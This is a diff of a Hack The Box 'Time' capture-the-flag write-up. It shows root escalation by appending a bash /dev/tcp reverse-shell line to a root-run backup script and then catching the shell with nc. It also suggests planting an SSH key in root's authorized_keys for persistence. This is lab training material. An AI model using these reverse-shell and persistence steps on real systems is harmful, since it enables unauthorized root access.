@@ -119,32 +119,24 @@ zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
 pericles@time:/usr/bin$ echo "bash -i >& /dev/tcp/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
 <p/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
 ```
-**Till Now it's OK and you will get reverse shell to your listner, But for ONLY 5 seconds i think and that is the idea of TIME box, So you have to be very fast to cat your 
+**Till Now it's OK and you will get reverse shell to your listner, But for ONLY 5 seconds i think and that is the idea of TIME box, So you have to be very fast to cat your root flag ```cat /root/root.txt``` as always to find the root flag, So the first solution of adding our public key to the authorized keys for root is the best, Because it's will give us persistence to get access to root for TIME box.**
+
+```bash
+yahia@Y4h1a:~$ nc -nlvp 4321
+Listening on 0.0.0.0 4321
+Connection received on 10.10.10.214 45098
+bash: cannot set terminal process group (228025): Inappropriate ioctl for device
+bash: no job control in this shell
+root@time:/# cat /root/root.txt
+cat /root/root.txt
+7a6040***********b14a463fcd5
+```
+# RooTed
+
+<script src="https://www.hackthebox.eu/badge/209461"></script>
 
 
 
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
-![]()
+
 ![]()
 ![]()
